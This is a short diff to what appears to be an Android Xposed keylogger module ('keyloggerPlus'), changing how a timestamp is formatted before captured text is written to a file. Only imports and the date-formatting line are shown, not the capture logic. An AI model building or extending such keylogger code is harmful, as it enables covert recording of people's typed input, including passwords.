@@ -3,9 +3,10 @@ package com.sscsps.keyloggerPlus;
 import java.io.BufferedWriter;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.text.DateFormat;
+import java.text.SimpleDateFormat;
 import java.util.Date;
 
+import android.annotation.SuppressLint;
 import android.os.Environment;
 import android.text.Editable;
 import android.text.TextWatcher;
@@ -98,7 +99,8 @@ public class Hook implements IXposedHookZygoteInit {
 			}
 
 		//getting the current date and time
-		String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
+		@SuppressLint("SimpleDateFormat")
+		final String currentDateTimeString = new SimpleDateFormat("dd-MM-yy @ HH:mm:ss").format(new Date());
 
 		try {
 			//Write it
